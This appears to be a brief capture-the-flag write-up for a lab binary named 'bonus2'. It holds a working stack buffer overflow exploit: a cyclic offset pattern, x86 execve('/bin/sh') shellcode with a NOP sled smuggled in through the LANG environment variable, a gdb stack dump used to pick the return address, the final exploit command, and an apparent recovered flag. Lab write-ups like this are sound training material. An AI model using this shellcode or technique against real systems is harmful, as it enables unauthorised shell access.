```bash
run $(python -c "print 'A' * 40") Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```
  
`0x38614137 -> offset == 23`

```
nl -> DAT_08048740
fi -> DAT_0804873d
```
  
```bash
export LANG=$(python -c 'print "nl" + "\x90"*153 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')

> gdb ./bonus2
> break main
> run
> x/600wx $esp
0xbffff808: 0x90909090 0x90909090 0x90909090 0x90909090
0xbffff818: 0x90909090 0x90909090 0x90909090 0x90909090 # This one
0xbffff828: 0x90909090 0x90909090 0x90909090 0x90909090

0xbffffe9c
```

```bash
./bonus2 $(python -c "print 'A' * 40") $(python -c "import struct; print('B' * 23 + struct.pack('I',0xbffffe9c))")
```

  `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
